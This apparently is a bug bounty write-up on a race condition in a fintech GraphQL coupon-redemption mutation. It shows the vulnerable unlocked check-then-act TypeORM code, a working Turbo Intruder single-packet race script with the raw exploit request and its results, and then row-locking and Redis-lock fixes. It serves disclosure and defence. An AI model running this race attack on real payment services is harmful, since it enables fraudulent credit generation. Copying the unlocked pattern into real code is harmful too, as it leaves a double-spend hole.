---
title: "Race Condition & Concurrency Flaws in GraphQL Coupon Redemption"
description: "How exploiting HTTP/2 concurrent single-packet race condition in a fintech GraphQL mutation allowed infinite promotional voucher redemption."
pubDate: "2024-04-10"
author: "Abubakar Jamilu Bashir"
categories: ["Bug Bounty", "Web Security"]
tags: ["race-condition", "graphql", "concurrency", "business-logic", "fintech", "bounty"]
pin: false
severity: "High"
bounty: "$2,800"
cvss: "8.1"
---
# Executive Summary

During a web security assessment on a digital wallet and e-commerce platform, I discovered a critical concurrency vulnerability (Race Condition / TOCTOU) within the coupon redemption GraphQL endpoint.

By sending synchronized HTTP/2 multiplexed requests, an attacker could redeem a single-use $50 promotional coupon multiple times simultaneously before the database transaction locked the record, multiplying account balances arbitrarily.

---

## Vulnerability Scorecard

- **Vulnerability Type**: Concurrent Execution using Shared Resource with Improper Synchronization (CWE-362)
- **Severity**: High (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N - **8.1**)
- **Bounty Awarded**: **$2,800**
- **Impact**: Unlimited unauthorized credit generation and monetary balance multiplication.

---

## Root Cause Analysis

The application utilized an asynchronous Node.js backend with an Object-Relational Mapping (ORM) layer that followed a **Check-Then-Act** pattern without database row locking:

```typescript
// Vulnerable Server-side Logic (Node.js / TypeORM)
async function redeemCoupon(userId: string, code: string) {
  // Step 1: Check if coupon was already redeemed (READ)
  const coupon = await couponRepo.findOne({ where: { code, isUsed: false } });
  if (!coupon) {
    throw new Error("Coupon already used or invalid.");
  }

  // Step 2: Delay during payment wallet balance update (ASYNC GAP)
  await walletService.addCredit(userId, coupon.amount);

  // Step 3: Mark coupon as used (WRITE)
  coupon.isUsed = true;
  await couponRepo.save(coupon);
}
```

Because **Step 1** (Check) and **Step 3** (Write) are not executed in an atomic database transaction with pessimistic locking, 20-30 requests received within the same millisecond window all observe `isUsed == false`.

---

## Technical Exploitation with HTTP/2 Single-Packet Attack

Using Turbo Intruder in Burp Suite, we leveraged HTTP/2 multiplexing to stack 30 redemption requests across a single TCP packet so they arrived on the backend server concurrently.

### Turbo Intruder Script
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    # Queue 25 identical requests with the single-packet gate
    for i in range(25):
        engine.queue(target.req, gate=race1)

    # Release all requests at once
    engine.openGate(race1)

def handleResponse(req, interesting):
    table.add(req)
```

### Raw Intercepted GraphQL Request
```http
POST /graphql HTTP/2
Host: pay.target-fintech.com
Authorization: Bearer eyJhbGciOi...
Content-Type: application/json

{
  "operationName": "ApplyPromoCode",
  "query": "mutation ApplyPromoCode($code: String!) { applyPromoCode(code: $code) { success creditedAmount newBalance } }",
  "variables": {
    "code": "PROMO-WELCOME-50"
  }
}
```

### Exploitation Results
Out of 25 simultaneous requests, **14 succeeded**, resulting in $700 credited to the test wallet instead of the intended $50 single-use limit.

---

## Defensive Engineering & Fix

### 1. Database-Level Atomic Transactions with Row-Locking
Wrap the operation inside a serializable transaction or utilize pessimistic write locks (`SELECT ... FOR UPDATE`):

```typescript
// Secure Implementation with TypeORM Pessimistic Write Lock
await dataSource.transaction(async (transactionalEntityManager) => {
  const coupon = await transactionalEntityManager
    .createQueryBuilder(Coupon, "coupon")
    .setLock("pessimistic_write")
    .where("coupon.code = :code AND coupon.isUsed = false", { code })
    .getOne();

  if (!coupon) {
    throw new Error("Coupon invalid or already claimed.");
  }

  coupon.isUsed = true;
  await transactionalEntityManager.save(coupon);

  await walletService.addCredit(userId, coupon.amount, transactionalEntityManager);
});
```

### 2. Redis Distributed Locks
For high-traffic distributed microservices, use Redlock / Redis token locking on the coupon code before processing:

```typescript
const lock = await redlock.acquire([`locks:coupon:${code}`], 2000);
try {
  await processRedemption(userId, code);
} finally {
  await lock.release();
}
```

---

## Timeline

- **2024-04-10**: Report submitted with reproduction script and Turbo Intruder template.
- **2024-04-10**: Triaged as High severity.
- **2024-04-12**: Patch deployed with PostgreSQL pessimistic row locks.
- **2024-04-14**: Retested and confirmed resolved; **$2,800 bounty** awarded.
